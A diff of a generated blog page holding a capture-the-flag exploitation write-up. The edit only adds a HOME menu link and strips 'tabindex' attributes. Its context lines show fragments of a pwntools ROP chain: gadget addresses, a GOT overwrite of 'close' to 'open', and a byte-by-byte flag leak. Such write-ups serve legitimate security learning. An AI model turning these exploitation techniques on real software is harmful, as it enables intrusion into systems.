@@ -40,10 +40,12 @@
 
             <ul class="menu">
                 <li class="menu-item "><a class="menu__link" href="/crackmes/">CRACKMES</a></li>
+                <li class="menu-item "><a class="menu__link" href="/">HOME</a></li>
                 <li class="menu-item "><a class="menu__link" href="/posts/">POSTS</a></li>
             </ul>
             <select onChange="location.href=value;">
                 <option value="/crackmes/" class="menu-item menu-item-type-custom menu-item-object-custom" >CRACKMES</option>
+                <option value="/" class="menu-item menu-item-type-custom menu-item-object-custom" >HOME</option>
                 <option value="/posts/" class="menu-item menu-item-type-custom menu-item-object-custom" >POSTS</option>
             </select>
         </nav>
@@ -422,7 +424,7 @@ was stored on the <strong>.BSS</strong> section, which was very crucial for my e
 
 
 <p>The rop chain looks like this.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#6272a4"># gadgets</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#6272a4"># gadgets</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>POP_RDI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401573</span>  <span style="color:#6272a4"># pop rdi ; ret</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>POP_RSI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401571</span>  <span style="color:#6272a4"># pop rsi ; pop r15 ; ret</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>POP_RSP <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40156d</span>  <span style="color:#6272a4"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span>
@@ -464,7 +466,7 @@ was stored on the <strong>.BSS</strong> section, which was very crucial for my e
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(ADD_VAL)
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span>
 </code></pre></div><p>With the setup complete, lets create the parent rop chain.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI)           <span style="color:#6272a4"># rdi = status_word - 0x20</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI)           <span style="color:#6272a4"># rdi = status_word - 0x20</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(STATUSG <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x20</span>)
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>])   <span style="color:#6272a4"># rbx = 0</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)
@@ -496,7 +498,7 @@ was stored on the <strong>.BSS</strong> section, which was very crucial for my e
   />
 </div>
 <p>After this we resolve the <strong>close</strong> <strong>GOT</strong> address to <strong>open</strong> and fix the <strong>read</strong> <strong>GOT</strong> address. We also put the flag string in memory to be used by child ropchain to open the flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#6272a4"># set close -&gt; open64</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">7</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX)
@@ -525,7 +527,7 @@ was stored on the <strong>.BSS</strong> section, which was very crucial for my e
 </code></pre></div><p>Once you figure out how to execute different ROP chains with the same payload under parent and child, the rest of the exploitation is fairly easy.</p>
 <p>I created a small function to give me ROP chain to leak a specific byte from the flag and then I just ran that exploit until I leaked the &ldquo;}&rdquo; character which means we got the whole flag.</p>
 <p>To get a nice output from the exploit I used pwntool&rsquo;s logging functionality.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34; &#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34; &#34;</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ff79c6">with</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>local(log_level<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;warn&#39;</span>), \
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>progress(<span style="color:#f1fa8c">&#39;Flag&#39;</span>, level<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>logging<span style="color:#ff79c6">.</span>WARN) <span style="color:#ff79c6">as</span> flag_leak:
